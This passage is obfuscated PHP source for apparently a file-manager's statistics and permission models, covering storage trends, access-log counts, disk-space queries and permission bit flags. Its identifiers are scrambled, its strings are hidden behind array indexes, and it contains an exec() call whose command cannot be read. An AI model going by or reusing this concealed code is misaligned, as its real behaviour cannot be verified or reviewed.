$B¥å¦×›³å = array($C‚ˆ…ñÉøÈ[187] => array($C‚ˆ…ñÉøÈ[921], $DÎ¬ôÏ½„ì)); goto Bš©â™¶ßÅ; Bš©â™¶ßÅ: $D±“¾Çµ‹¨ = Model($C‚ˆ…ñÉøÈ[422])->where($B¥å¦×›³å)->sum($C‚ˆ…ñÉøÈ[77]); $B¥å¦×›³å[$C‚ˆ…ñÉøÈ[370]] = 0; $FÊæÄàÔÍ = Model($C‚ˆ…ñÉøÈ[752])->where($B¥å¦×›³å)->sum($C‚ˆ…ñÉøÈ[77]); goto d­ŞÜ›¶ñß; aÁÅ•ßã¿: $CöÛÁ¥…ø = Model($C‚ˆ…ñÉøÈ[752])->where($B¥å¦×›³å)->sum($C‚ˆ…ñÉøÈ[77]); $dè×¸§Õî = array($C‚ˆ…ñÉøÈ[210] => $BÅ‡ğÆ“êÙ, $C‚ˆ…ñÉøÈ[697] => (int) $FÊæÄàÔÍ, $C‚ˆ…ñÉøÈ[2029] => (int) $D±“¾Çµ‹¨, $C‚ˆ…ñÉøÈ[2030] => (int) $FéŠË¸ÌÖ´, $C‚ˆ…ñÉøÈ[2031] => (int) $CöÛÁ¥…ø); return $this->insert($dè×¸§Õî); goto B‘Æ½ªÓù; B‘Æ½ªÓù: } public function trend($bè„‹à›¼è, $AìŞ‘è”’) { goto aíô¢½íÌ¿; DÛ›š¢Ú‰: return $C·„ÊäÍìÛ; goto BĞ™äğ—±‚; Aˆ¦Úå†: if (empty($D²ÒÏÎˆºÔ)) { $DÓ‹œÀ‡Ï¬ = date($AŠ˜Î÷Ó»[2032], strtotime($AŠ˜Î÷Ó»[2033])); $bÂÄÁ¥ÚèÏ = array($AŠ˜Î÷Ó»[210] => $DÓ‹œÀ‡Ï¬); foreach ($C¤¡—Î’ã[$bè„‹à›¼è] as $eì­ô«‰¥è => $CÉ¸³ƒôÊ°) { $bÂÄÁ¥ÚèÏ[$eì­ô«‰¥è] = 0; } $D²ÒÏÎˆºÔ[] = $bÂÄÁ¥ÚèÏ; } $C·„ÊäÍìÛ = array(); foreach ($D²ÒÏÎˆºÔ as $CÉ¸³ƒôÊ°) { if ($bè„‹à›¼è == $AŠ˜Î÷Ó»[2027] && $CÉ¸³ƒôÊ°[$AŠ˜Î÷Ó»[2029]] > $CÉ¸³ƒôÊ°[$AŠ˜Î÷Ó»[697]]) { $CÉ¸³ƒôÊ°[$AŠ˜Î÷Ó»[2029]] = $CÉ¸³ƒôÊ°[$AŠ˜Î÷Ó»[697]]; } foreach ($C¤¡—Î’ã[$bè„‹à›¼è] as $eì­ô«‰¥è => $E˜Œ½êÊ˜´) { $dˆÍ–·’¼Ø = array($AŠ˜Î÷Ó»[210] => $CÉ¸³ƒôÊ°[$AŠ˜Î÷Ó»[210]], $AŠ˜Î÷Ó»[1337] => $E˜Œ½êÊ˜´); $dˆÍ–·’¼Ø[$CÓÅ¸Æã¾É[$bè„‹à›¼è]] = isset($CÉ¸³ƒôÊ°[$eì­ô«‰¥è]) ? $CÉ¸³ƒôÊ°[$eì­ô«‰¥è] : 0; $C·„ÊäÍìÛ[] = $dˆÍ–·’¼Ø; } } goto DÛ›š¢Ú‰; aíô¢½íÌ¿: $AŠ˜Î÷Ó» =& $_SERVER[îÖ]; if (!$this->init($bè„‹à›¼è)) { return !1; } $D²ÒÏÎˆºÔ = $this->trendList($bè„‹à›¼è); goto BâÆÏÛˆ´; BâÆÏÛˆ´: if ($D²ÒÏÎˆºÔ && $AìŞ‘è”’ != $AŠ˜Î÷Ó»[1406]) { $eÄåà‡¨ä = $D²ÒÏÎˆºÔ[0][$AŠ˜Î÷Ó»[210]]; $fã×±‚×Ô­ = $this->validDate($AìŞ‘è”’, $eÄåà‡¨ä); $DÌéÆŒğŸ¨ = array(); $BíÇ‡óÁº = array_to_keyvalue($D²ÒÏÎˆºÔ, $AŠ˜Î÷Ó»[210]); foreach ($fã×±‚×Ô­ as $DÓ‹œÀ‡Ï¬) { if (isset($BíÇ‡óÁº[$DÓ‹œÀ‡Ï¬])) { $dˆÍ–·’¼Ø = $BíÇ‡óÁº[$DÓ‹œÀ‡Ï¬]; } else { $dˆÍ–·’¼Ø = end($D²ÒÏÎˆºÔ); $dˆÍ–·’¼Ø[$AŠ˜Î÷Ó»[210]] = $DÓ‹œÀ‡Ï¬; if ($bè„‹à›¼è == $AŠ˜Î÷Ó»[535]) { $dˆÍ–·’¼Ø[$AŠ˜Î÷Ó»[2025]] = $dˆÍ–·’¼Ø[$AŠ˜Î÷Ó»[2026]] = 0; } } $DÌéÆŒğŸ¨[] = $dˆÍ–·’¼Ø; } $D²ÒÏÎˆºÔ = $DÌéÆŒğŸ¨; } $C¤¡—Î’ã = array($AŠ˜Î÷Ó»[535] => array($AŠ˜Î÷Ó»[699] => LNG($AŠ˜Î÷Ó»[2041]), $AŠ˜Î÷Ó»[2025] => LNG($AŠ˜Î÷Ó»[2042]), $AŠ˜Î÷Ó»[2026] => LNG($AŠ˜Î÷Ó»[2043])), $AŠ˜Î÷Ó»[2027] => array($AŠ˜Î÷Ó»[697] => LNG($AŠ˜Î÷Ó»[2044]), $AŠ˜Î÷Ó»[2029] => LNG($AŠ˜Î÷Ó»[2045]), $AŠ˜Î÷Ó»[2030] => LNG($AŠ˜Î÷Ó»[2046]), $AŠ˜Î÷Ó»[2031] => LNG($AŠ˜Î÷Ó»[2047]))); $CÓÅ¸Æã¾É = array($AŠ˜Î÷Ó»[535] => $AŠ˜Î÷Ó»[2048], $AŠ˜Î÷Ó»[2027] => $AŠ˜Î÷Ó»[77]); goto Aˆ¦Úå†; BĞ™äğ—±‚: } public function validDate($AäµÁæéµÏ, $D´ÌËé¦ô¿) { goto D¾ÛÌâòó”; D¾ÛÌâòó”: $eÇó‹º“ß =& $_SERVER[îÖ]; $a¸ÉÖŒ¿Õ„ = date($eÇó‹º“ß[2032], strtotime($eÇó‹º“ß[2033])); $FÆ½°ÈãëĞ = array($a¸ÉÖŒ¿Õ„); goto döÄä¢†º; döÄä¢†º: switch ($AäµÁæéµÏ) { case $eÇó‹º“ß[1413]: $eÃîŒíƒ¸› = mktime(0, 0, 0, date($eÇó‹º“ß[2049]), date($eÇó‹º“ß[2050]) - date($eÇó‹º“ß[1220]) + 7 - 7, date($eÇó‹º“ß[2051])); $Dê¬‚º¬­ = 0; do { $e”ÏÈ¾Ñ¿ˆ = date($eÇó‹º“ß[2032], $eÃîŒíƒ¸› - 3600 * 24 * 7 * $Dê¬‚º¬­); $FÆ½°ÈãëĞ[] = $e”ÏÈ¾Ñ¿ˆ; $Dê¬‚º¬­++; } while ($D´ÌËé¦ô¿ < $e”ÏÈ¾Ñ¿ˆ); break; case $eÇó‹º“ß[1411]: $Dê¬‚º¬­ = 1; do { $C”‘ƒ¯ó³¹ = date($eÇó‹º“ß[2052], strtotime("\x2d\40{$Dê¬‚º¬­}\40\155\x6f\156\164\x68\163")); $FÆ½°ÈãëĞ[] = $C”‘ƒ¯ó³¹; $Dê¬‚º¬­++; } while ($D´ÌËé¦ô¿ < $C”‘ƒ¯ó³¹); break; case $eÇó‹º“ß[1720]: $C…ª«öâ¿ù = (int) date($eÇó‹º“ß[2051], strtotime($D´ÌËé¦ô¿)); $A˜çó’‚ôŞ = (int) date($eÇó‹º“ß[2051]); if ($C…ª«öâ¿ù >= $A˜çó’‚ôŞ) { break; } for ($C…ª«öâ¿ù; $C…ª«öâ¿ù < $A˜çó’‚ôŞ; $C…ª«öâ¿ù++) { $FÆ½°ÈãëĞ[] = $C…ª«öâ¿ù . $eÇó‹º“ß[2053]; } break; default: break; } if ($D´ÌËé¦ô¿ > end($FÆ½°ÈãëĞ)) { array_pop($FÆ½°ÈãëĞ); } sort($FÆ½°ÈãëĞ); goto fìÁ›Ó·‰Õ; fìÁ›Ó·‰Õ: return $FÆ½°ÈãëĞ; goto d¹ğ„ŞÑ; d¹ğ„ŞÑ: } public function listTable($AÅÖ¼‹Ğ¯Æ) { $càÍÖ´¿ = ucfirst($AÅÖ¼‹Ğ¯Æ); return Model($càÍÖ´¿)->listData(); } public function option($C²ƒ°ÂÌ) { $A›‚¬£œ¢¥ = $_SERVER[îÖ][2054] . ucfirst($C²ƒ°ÂÌ); return $this->{$A›‚¬£œ¢¥}(); } private function optionUser() { goto e¥À¥¬¨©…; e¥À¥¬¨©…: $Cˆ˜§Ó¡à =& $_SERVER[îÖ]; $D´¥«ÇÕÖ = Model($Cˆ˜§Ó¡à[477])->count($Cˆ˜§Ó¡à[1431]); $dñ±‡ô—ò¢ = Model($Cˆ˜§Ó¡à[477])->where($Cˆ˜§Ó¡à[2055])->count($Cˆ˜§Ó¡à[1431]); goto cäÁšµ‘ææ; d•àÒè­: if (!$cõŒ¿ÇïğÔ) { $cõŒ¿ÇïğÔ = 1; } $F´ìˆùÃœÑ = strtotime(date($Cˆ˜§Ó¡à[2036])); $a¢½äÁø– = array($Cˆ˜§Ó¡à[2057] => array($Cˆ˜§Ó¡à[922], $F´ìˆùÃœÑ)); goto a´‘ÅâÚ; cäÁšµ‘ææ: $F´ìˆùÃœÑ = strtotime($Cˆ˜§Ó¡à[2056]); $a¢½äÁø– = array($Cˆ˜§Ó¡à[2057] => array($Cˆ˜§Ó¡à[922], $F´ìˆùÃœÑ)); $cõŒ¿ÇïğÔ = (int) Model($Cˆ˜§Ó¡à[477])->where($a¢½äÁø–)->count($Cˆ˜§Ó¡à[1431]); goto d•àÒè­; a´‘ÅâÚ: $E‚Ûö»» = Model($Cˆ˜§Ó¡à[477])->where($a¢½äÁø–)->count($Cˆ˜§Ó¡à[1431]); return array($Cˆ˜§Ó¡à[694] => (int) $D´¥«ÇÕÖ, $Cˆ˜§Ó¡à[2058] => (int) ($D´¥«ÇÕÖ - $dñ±‡ô—ò¢), $Cˆ˜§Ó¡à[2059] => (int) $dñ±‡ô—ò¢, $Cˆ˜§Ó¡à[2060] => (int) $E‚Ûö»», $Cˆ˜§Ó¡à[2061] => $cõŒ¿ÇïğÔ); goto cÍ®›Ç„ç±; cÍ®›Ç„ç±: } private function optionFile() { goto cïÇö¸‚ä´; cïÇö¸‚ä´: $DÏ–šøÍ» =& $_SERVER[îÖ]; $dñ‚·Ä®¹ = $this->sourceSize(); $bøøãç…‘” = $dñ‚·Ä®¹[$DÏ–šøÍ»[77]]; goto F¹©áêšä; F¹©áêšä: $F³éº½Òàµ = $dñ‚·Ä®¹[$DÏ–šøÍ»[2029]]; $Cè­æ‘íÂÔ = Model($DÏ–šøÍ»[752])->where(array($DÏ–šøÍ»[370] => 0))->count($DÏ–šøÍ»[369]); $Bò²™ëç„‰ = array($DÏ–šøÍ»[370] => 0, $DÏ–šøÍ»[187] => array($DÏ–šøÍ»[922], strtotime(date($DÏ–šøÍ»[2036])))); goto F¥¶¬¼ğ‘; F¥¶¬¼ğ‘: $B®íîÁŸÅä = Model($DÏ–šøÍ»[752])->where($Bò²™ëç„‰)->sum($DÏ–šøÍ»[77]); $C¬¾†×˜Å¸ = Model($DÏ–šøÍ»[752])->where($Bò²™ëç„‰)->count($DÏ–šøÍ»[369]); return array($DÏ–šøÍ»[697] => $bøøãç…‘”, $DÏ–šøÍ»[2029] => $F³éº½Òàµ, $DÏ–šøÍ»[2062] => $bøøãç…‘” - $F³éº½Òàµ, $DÏ–šøÍ»[2063] => (int) $B®íîÁŸÅä, $DÏ–šøÍ»[699] => (int) $Cè­æ‘íÂÔ, $DÏ–šøÍ»[2064] => (int) $C¬¾†×˜Å¸); goto d¿ËÃ¸îÛ£; d¿ËÃ¸îÛ£: } private function optionAccess() { $B—Ã‚è«› =& $_SERVER[îÖ]; return array($B—Ã‚è«›[694] => $this->typeLogCnt(), $B—Ã‚è«›[103] => $this->typeLogCnt($B—Ã‚è«›[103]), $B—Ã‚è«›[404] => $this->typeLogCnt($B—Ã‚è«›[404]), $B—Ã‚è«›[2065] => $this->typeLogCnt($B—Ã‚è«›[2065]), $B—Ã‚è«›[2066] => $this->typeLogCnt($B—Ã‚è«›[2066]), $B—Ã‚è«›[535] => $this->typeLogCnt($B—Ã‚è«›[33], $B—Ã‚è«›[2040])); } private function typeLogCnt($CÓ¹ÜñÎ·ª = '', $b¼©—¦Ô²í = "\151\x64") { goto BÉí‹ˆâÌ·; d”‹ğ±ôß: $EÔ”¥ˆ®ôá = array($A®ÆÆæ—Ğ[187] => array($A®ÆÆæ—Ğ[922], $CÕšƒÌã‡’)); if ($CÓ¹ÜñÎ·ª) { $EÔ”¥ˆ®ôá[$A®ÆÆæ—Ğ[29]] = array($A®ÆÆæ—Ğ[7], $dÊ‹¦À‘Ş†[$CÓ¹ÜñÎ·ª]); } $A¹²í‚ÚÑÌ = Model($A®ÆÆæ—Ğ[2039])->where($EÔ”¥ˆ®ôá)->count($b¼©—¦Ô²í); goto C‚Ó¹Í¥Ô×; C‚Ó¹Í¥Ô×: return (int) $A¹²í‚ÚÑÌ; goto E¢†Ü’‚ñ“; BÉí‹ˆâÌ·: $A®ÆÆæ—Ğ =& $_SERVER[îÖ]; $dÊ‹¦À‘Ş† = array($A®ÆÆæ—Ğ[103] => array($A®ÆÆæ—Ğ[2067], $A®ÆÆæ—Ğ[2068]), $A®ÆÆæ—Ğ[404] => array($A®ÆÆæ—Ğ[2069], $A®ÆÆæ—Ğ[2070]), $A®ÆÆæ—Ğ[2065] => array($A®ÆÆæ—Ğ[2071], $A®ÆÆæ—Ğ[2072], $A®ÆÆæ—Ğ[2073]), $A®ÆÆæ—Ğ[2066] => array($A®ÆÆæ—Ğ[2074], $A®ÆÆæ—Ğ[2075]), $A®ÆÆæ—Ğ[2076] => array($A®ÆÆæ—Ğ[2077], $A®ÆÆæ—Ğ[2078], $A®ÆÆæ—Ğ[2079])); $CÕšƒÌã‡’ = strtotime(date($A®ÆÆæ—Ğ[2036])); goto d”‹ğ±ôß; E¢†Ü’‚ñ“: } private function optionServer() { goto FŒ³ÀêøÛğ; B—®®íÆ: $A…óêµ¨ = array($eÉÆÛËßå[743] => $cïê¾åï¯[$eÉÆÛËßå[367]]); $A·¡···™Å = Model($eÉÆÛËßå[422])->where($A…óêµ¨)->sum($eÉÆÛËßå[77]); $B‚Ã‰¸ÕÈò = explode($eÉÆÛËßå[50], $_SERVER[$eÉÆÛËßå[139]]); goto Dª¥¤ğ¤÷; c²²â…´Ò: if ($B¬öƒİ¼¯ == $eÉÆÛËßå[723]) { $fí‘²ÉÙƒê = explode($eÉÆÛËßå[1070], $FÎÃÌ“¨™Á[$eÉÆÛËßå[881]]); $B¬öƒİ¼¯ = $fí‘²ÉÙƒê[0]; } if ($B¬öƒİ¼¯ == $eÉÆÛËßå[726] || $B¬öƒİ¼¯ == $eÉÆÛËßå[727]) { $d”£¹Ÿ²· = Model()->db()->query($eÉÆÛËßå[2080]); $d¶Ÿ”İ†‚¨ = $d”£¹Ÿ²·[0] && isset($d”£¹Ÿ²·[0][$eÉÆÛËßå[1336]]) ? $d”£¹Ÿ²·[0][$eÉÆÛËßå[1336]] : 0; $B¬öƒİ¼¯ = $eÉÆÛËßå[2081] . ($d¶Ÿ”İ†‚¨ ? $eÉÆÛËßå[8] . $d¶Ÿ”İ†‚¨ : $eÉÆÛËßå[33]); } $eçÂ”ÏŞÛ = $GLOBALS[$eÉÆÛËßå[6]][$eÉÆÛËßå[337]][$eÉÆÛËßå[754]]; goto D‰ğô§¶‰Ö; D‰ğô§¶‰Ö: return array($eÉÆÛËßå[2082] => $AÌÕ…„á‘ß ? $AÌÕ…„á‘ß[$eÉÆÛËßå[2083]] : 0, $eÉÆÛËßå[2084] => $AÌÕ…„á‘ß ? $AÌÕ…„á‘ß[$eÉÆÛËßå[2085]] : 0, $eÉÆÛËßå[2086] => (int) $cïê¾åï¯[$eÉÆÛËßå[2083]] * 1024 * 1024 * 1024, $eÉÆÛËßå[2087] => (int) $A·¡···™Å, $eÉÆÛËßå[2088] => ucfirst($F¤ù½â²öã), $eÉÆÛËßå[2089] => $eÉÆÛËßå[2090] . PHP_VERSION, $eÉÆÛËßå[2091] => phpBuild64() ? 64 : 32, $eÉÆÛËßå[693] => str_replace($eÉÆÛËßå[2092], $eÉÆÛËßå[898], $B¬öƒİ¼¯), $eÉÆÛËßå[337] => ucfirst($eçÂ”ÏŞÛ), $eÉÆÛËßå[28] => $_SERVER[$eÉÆÛËßå[2093]]); goto DÄíá˜‚Ü×; FŒ³ÀêøÛğ: $eÉÆÛËßå =& $_SERVER[îÖ]; $AÌÕ…„á‘ß = $this->diskDriver(); $cïê¾åï¯ = KodIO::defaultDriver(); goto B—®®íÆ; Dª¥¤ğ¤÷: $F¤ù½â²öã = $B‚Ã‰¸ÕÈò[0]; $FÎÃÌ“¨™Á = $GLOBALS[$eÉÆÛËßå[6]][$eÉÆÛËßå[17]]; $B¬öƒİ¼¯ = $FÎÃÌ“¨™Á[$eÉÆÛËßå[882]]; goto c²²â…´Ò; DÄíá˜‚Ü×: } private function diskDriver() { goto E´„™ ¢Ñë; a¶Ó”¢³“: $FƒÜ§É„ = $eÀ¦ÆÉïŒ - @disk_free_space($E†× “µ†); return array($c¨ë¯¯ˆ‰¨[2083] => $eÀ¦ÆÉïŒ, $c¨ë¯¯ˆ‰¨[2085] => $FƒÜ§É„); goto CÅ¼Ù³ËÂù; Fï‰ø‰°Şñ: if ($dÂ±Ãß…Ç±) { $E†× “µ† = $c¨ë¯¯ˆ‰¨[2096]; if (function_exists($c¨ë¯¯ˆ‰¨[2097])) { exec($c¨ë¯¯ˆ‰¨[2098], $DÊÂÜä—™Ä); $E†× “µ† = $DÊÂÜä—™Ä[1] . $c¨ë¯¯ˆ‰¨[8]; } } if (!file_exists($E†× “µ†)) { return; } $eÀ¦ÆÉïŒ = @disk_total_space($E†× “µ†); goto a¶Ó”¢³“; E´„™ ¢Ñë: $c¨ë¯¯ˆ‰¨ =& $_SERVER[îÖ]; $E†× “µ† = $c¨ë¯¯ˆ‰¨[8]; $dÂ±Ãß…Ç± = $GLOBALS[$c¨ë¯¯ˆ‰¨[6]][$c¨ë¯¯ˆ‰¨[2094]] == $c¨ë¯¯ˆ‰¨[2095]; goto Fï‰ø‰°Şñ; CÅ¼Ù³ËÂù: } public function fileChart($F¥ˆóòå») { goto d¯Ó˜æŠŞ; f¥›Š‚ÊŸ: $F¬ŒÁµ…µ = $this->sourceSize(); $cîÁÕ÷ŞğÛ = array($D÷Ù•ŸŞ[461] => 0, $D÷Ù•ŸŞ[371] => 1); $D‹Ó‚Ÿğ¨™ = Model($D÷Ù•ŸŞ[752])->where($cîÁÕ÷ŞğÛ)->sum($D÷Ù•ŸŞ[77]); goto E¤‘÷‚´Æ—; E¤‘÷‚´Æ—: $cîÁÕ÷ŞğÛ[$D÷Ù•ŸŞ[371]] = 2; $cíß„ŞçÙ¿ = Model($D÷Ù•ŸŞ[752])->where($cîÁÕ÷ŞğÛ)->sum($D÷Ù•ŸŞ[77]); return array($D÷Ù•ŸŞ[697] => $F¬ŒÁµ…µ[$D÷Ù•ŸŞ[77]], $D÷Ù•ŸŞ[2029] => $F¬ŒÁµ…µ[$D÷Ù•ŸŞ[2029]], $D÷Ù•ŸŞ[2030] => (int) $D‹Ó‚Ÿğ¨™, $D÷Ù•ŸŞ[2031] => (int) $cíß„ŞçÙ¿); goto bĞÉµ®ğÑÆ; d¯Ó˜æŠŞ: $D÷Ù•ŸŞ =& $_SERVER[îÖ]; if (isset($F¥ˆóòå»[$D÷Ù•ŸŞ[1431]])) { return Model($D÷Ù•ŸŞ[752])->userFileTypeProfile($F¥ˆóòå»[$D÷Ù•ŸŞ[1431]]); } if (isset($F¥ˆóòå»[$D÷Ù•ŸŞ[2099]])) { return Model($D÷Ù•ŸŞ[752])->groupFileTypeProfile($F¥ˆóòå»[$D÷Ù•ŸŞ[2099]]); } goto f¥›Š‚ÊŸ; bĞÉµ®ğÑÆ: } private function sourceSize() { $DŒãîÃ„… =& $_SERVER[îÖ]; $E”Æ’ƒÉ•Å = Model($DŒãîÃ„…[752])->where(array($DŒãîÃ„…[370] => 0))->sum($DŒãîÃ„…[77]); $D²ÑÅÃôŸ‘ = Model($DŒãîÃ„…[422])->sum($DŒãîÃ„…[77]); if ($D²ÑÅÃôŸ‘ > $E”Æ’ƒÉ•Å) { $D²ÑÅÃôŸ‘ = $E”Æ’ƒÉ•Å; } return array($DŒãîÃ„…[77] => (int) $E”Æ’ƒÉ•Å, $DŒãîÃ„…[2029] => (int) $D²ÑÅÃôŸ‘); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $CåÌê ˆ‹ =& $_SERVER[îÖ]; $E†¬ÎÎ™¹ = array(array($CåÌê ˆ‹[386] => LNG($CåÌê ˆ‹[2100]), $CåÌê ˆ‹[2101] => $CåÌê ˆ‹[2102], $CåÌê ˆ‹[2103] => 6, $CåÌê ˆ‹[2104] => 1, $CåÌê ˆ‹[2105] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($CåÌê ˆ‹[386] => LNG($CåÌê ˆ‹[2106]), $CåÌê ˆ‹[2101] => $CåÌê ˆ‹[2107], $CåÌê ˆ‹[2103] => 1, $CåÌê ˆ‹[2104] => 1, $CåÌê ˆ‹[2105] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($CåÌê ˆ‹[386] => LNG($CåÌê ˆ‹[2108]), $CåÌê ˆ‹[2101] => $CåÌê ˆ‹[2109], $CåÌê ˆ‹[2103] => 2, $CåÌê ˆ‹[2104] => 1, $CåÌê ˆ‹[2105] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($CåÌê ˆ‹[386] => LNG($CåÌê ˆ‹[2110]), $CåÌê ˆ‹[2101] => $CåÌê ˆ‹[2109], $CåÌê ˆ‹[2103] => 3, $CåÌê ˆ‹[2104] => 1, $CåÌê ˆ‹[2105] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($CåÌê ˆ‹[386] => LNG($CåÌê ˆ‹[2111]), $CåÌê ˆ‹[2101] => $CåÌê ˆ‹[2112], $CåÌê ˆ‹[2103] => 4, $CåÌê ˆ‹[2104] => 1, $CåÌê ˆ‹[2105] => self::AUTH_SHOW | self::AUTH_VIEW), array($CåÌê ˆ‹[386] => LNG($CåÌê ˆ‹[2113]), $CåÌê ˆ‹[2101] => $CåÌê ˆ‹[2114], $CåÌê ˆ‹[2103] => 5, $CåÌê ˆ‹[2104] => 1, $CåÌê ˆ‹[2105] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($CåÌê ˆ‹[386] => LNG($CåÌê ˆ‹[2115]), $CåÌê ˆ‹[2101] => $CåÌê ˆ‹[2116], $CåÌê ˆ‹[2103] => 7, $CåÌê ˆ‹[2104] => 1, $CåÌê ˆ‹[2105] => 0)); return $E†¬ÎÎ™¹; } public static function authCheck($c¥ø„œ–Ôõ, $aíÆéî„Ô) { $c¥ø„œ–Ôõ = intval($c¥ø„œ–Ôõ); if (_get($GLOBALS, $_SERVER[îÖ][457])) { return !0; } if ($c¥ø„œ–Ôõ <= 0) { return !1; } if (($c¥ø„œ–Ôõ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($c¥ø„œ–Ôõ & $aíÆéî„Ô); } public static function authCheckShow($Fƒø‘ò§÷ë) { return self::authCheck($Fƒø‘ò§÷ë, self::AUTH_SHOW); } public static function authCheckView($A¡¿„¦‹øğ) { return self::authCheck($A¡¿„¦‹øğ, self::AUTH_VIEW); } public static function authCheckDownload($FÛÎÆÑˆ¤) { return self::authCheck($FÛÎÆÑˆ¤, self::AUTH_DOWNLOAD); } public static function authCheckUpload($cÃÚ ¨Ÿµ) { return self::authCheck($cÃÚ ¨Ÿµ, self::AUTH_UPLOAD); } public static function authCheckEdit($d¬ºšğ‰Ÿ²) { return self::authCheck($d¬ºšğ‰Ÿ², self::AUTH_EDIT); } public static function authCheckRemove($AæÆƒÙÁ¾§) { return self::authCheck($AæÆƒÙÁ¾§, self::AUTH_REMOVE); } public static function authCheckShare($C»Æ½ÈØœÔ) { return self::authCheck($C»Æ½ÈØœÔ, self::AUTH_SHARE); } public static function authCheckComment($a†Ü†ªùİê) { return self::authCheck($a†Ü†ªùİê, self::AUTH_COMMENT); } public static function authCheckEvent($cÍš„æœŠ®) { return self::authCheck($cÍš„æœŠ®, self::AUTH_EVENT); } public static function authCheckRoot($f ½¤†ÂÎ¿) { return self::authCheck($f ½¤†ÂÎ¿, self::AUTH_ROOT); } public static function authDisable($Aó˜øøÚœš, $D¤“‘âƒ™) { if (intval($Aó˜øøÚœš) <= 0) { return 0; } return intval($Aó˜øøÚœš) & ~$D¤“‘âƒ™; } public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x73\157\165\162\143\145\x41\165\x74\150\114\x69\163\x74"; public $field = array("\156\141\155\145", "\x61\165\164\150", "\154\x61\142\145\154", "\144\x69\x73\x70\x6c\141\x79", "\163\171\x73\x74\x65\x6d", "\163\157\162\164"); public function initData() { $f˜‰Š£¶…† = $this->authDefault(); foreach ($f˜‰Š£¶…† as $CÅ“§æËÍŠ) { $this->add($CÅ“§æËÍŠ); } } public function listData($eïŒ‡‘¶¯ = false, $eŞÕ¢«¥ò¡ = "\163\x6f\x72\x74", $B™ÑÌ÷Ş„‰ = false) { return parent::listData($eïŒ‡‘¶¯, $eŞÕ¢«¥ò¡, $B™ÑÌ÷Ş„‰); } public function update($aÖÄ¼®áÄÚ, $B˜“Óé÷øÎ) { $DŞÖ°¢»•é =& $_SERVER[îÖ]; $DÔ†à­‘‰ = parent::listData($aÖÄ¼®áÄÚ); $B„áï“Šß‚ = $this->findByName($B˜“Óé÷øÎ[$DŞÖ°¢»•é[28]]); if (!$DÔ†à­‘‰ || $B„áï“Šß‚ && $B„áï“Šß‚[$DŞÖ°¢»•é[367]] != $DÔ†à­‘‰[$DŞÖ°¢»•é[367]]) { return !1; } $this->filterAuth($B˜“Óé÷øÎ[$DŞÖ°¢»•é[376]]); return parent::update($aÖÄ¼®áÄÚ, $B˜“Óé÷øÎ); } public function remove($D”¶êß‘Öë) { $B°§´‡Öˆ‚ = parent::listData($D”¶êß‘Öë); if (!$B°§´‡Öˆ‚ || $B°§´‡Öˆ‚[$_SERVER[îÖ][1074]]) { return !1; } return parent::remove($D”¶êß‘Öë); } public function add($CÃØÃË‰¿“ = array()) { goto cŠµ½ˆ†›™; cŠµ½ˆ†›™: $bĞ‰‰–‰£ =& $_SERVER[îÖ]; if ($this->findByName($CÃØÃË‰¿“[$bĞ‰‰–‰£[28]])) { return !1; } $d“‰Áğƒ¹… = array($bĞ‰‰–‰£[28] => $bĞ‰‰–‰£[33], $bĞ‰‰–‰£[376] => 1, $bĞ‰‰–‰£[2117] => $bĞ‰‰–‰£[2118], $bĞ‰‰–‰£[2119] => 1, $bĞ‰‰–‰£[1074] => 0, $bĞ‰‰–‰£[2120] => 0); goto cŞ‰ÓÁõÃÉ; Dã›˜²É™Á: return parent::insert($CÃØÃË‰¿“); goto c‚Ï¸Ü³Ó; cŞ‰ÓÁõÃÉ: $CÃØÃË‰¿“ = array_merge($d“‰Áğƒ¹…, $CÃØÃË‰¿“); $CÃØÃË‰¿“[$bĞ‰‰–‰£[2120]] = $this->getSort(); $this->filterAuth($CÃØÃË‰¿“[$bĞ‰‰–‰£[376]]); goto Dã›˜²É™Á; c‚Ï¸Ü³Ó: } private function getSort() { $aß¡»éôÂç =& $_SERVER[îÖ]; $cáğå¨Äïà = parent::listData(); $A¥ÏŞÊƒè¿ = array_to_keyvalue($cáğå¨Äïà, $aß¡»éôÂç[33], $aß¡»éôÂç[2120]); return empty($A¥ÏŞÊƒè¿) ? 0 : max($A¥ÏŞÊƒè¿) + 1; } private function filterAuth(&$FŒ¾‡’ÏÒ) { goto eèˆ‰Ùˆ«‡; eèˆ‰Ùˆ«‡: if (!$FŒ¾‡’ÏÒ) { return; } $BÇ¸ »‘ùÆ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $c´Ã³ãŠŒ = array(); goto CäƒÄœ²•; A£±³ÛÎ«¹: foreach ($c´Ã³ãŠŒ as $A¦ÙÅ‹¥š) { if (isset($c‹™¯Ì³•‘[$A¦ÙÅ‹¥š])) { $c´Ã³ãŠŒ = array_merge($c´Ã³ãŠŒ, $c‹™¯Ì³•‘[$A¦ÙÅ‹¥š]); } } $c´Ã³ãŠŒ[] = self::AUTH_SHOW; $FŒ¾‡’ÏÒ = array_sum(array_unique($c´Ã³ãŠŒ)); goto eª«áİ¥ò“; CäƒÄœ²•: foreach ($BÇ¸ »‘ùÆ as $A¦ÙÅ‹¥š) { if ($FŒ¾‡’ÏÒ & $A¦ÙÅ‹¥š) { $c´Ã³ãŠŒ[] = 